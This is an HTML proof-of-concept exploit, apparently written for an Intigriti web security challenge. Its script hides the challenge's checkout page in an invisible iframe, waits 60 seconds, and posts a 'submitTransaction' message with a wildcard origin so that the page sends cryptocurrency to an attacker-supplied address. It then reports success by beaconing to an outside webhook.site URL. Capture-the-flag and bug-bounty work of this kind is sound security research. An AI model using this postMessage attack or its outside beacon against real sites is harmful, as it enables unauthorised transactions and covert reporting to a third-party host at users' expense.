<!DOCTYPE html>
<html>
<body>
<script>
/*
  Phase 1 â€“ definitive transaction test
  - No DOM access
  - No UI simulation
  - Only postMessage
  - Long delay to ensure wallets are loaded
*/

const ADDRESS = "114a580aae95817f9bf8d3704eb6e69417";
const WEBHOOK = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";

// Load checkout page as admin
const iframe = document.createElement("iframe");
iframe.style.display = "none";
iframe.src =
  "https://challenge-0126.intigriti.io/checkout.html" +
  "?currency=1337COIN&price=1337";

document.body.appendChild(iframe);

// Wait 60 seconds for full initialization
setTimeout(() => {
  // Send the vulnerable message
  iframe.contentWindow.postMessage({
    type: "submitTransaction",
    transaction: {
      toAddress: ADDRESS,
      currency: "1337COIN",
      amount: 1
    }
  }, "*");

  // Beacon for confirmation
  new Image().src =
    WEBHOOK + "?step=postmessage_sent&ts=" + Date.now();

}, 60000);
</script>
</body>
</html>
